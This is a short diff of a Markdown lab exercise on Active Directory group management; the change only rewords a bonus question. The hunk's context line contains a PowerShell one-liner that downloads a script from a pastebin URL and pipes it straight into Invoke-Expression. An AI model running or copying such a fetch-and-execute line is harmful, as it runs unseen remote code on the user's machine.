@@ -116,7 +116,7 @@ $section = 'ADG3'; iwr 'https://pastebin.com/raw/tQ95Q7Xh' -UseB | iex
 
 You should have evaluated if the requestor is the manager of that AD group; which he is.
 
-*Bonus:* Learner should also evaluate all AD objects and determine if Chucky was listed as the manager of anything.
+*Bonus:* You should also evaluate all AD objects and determine if Chucky was listed as the manager of anything.
 </div>
 
 ## New Technician – KVM Access
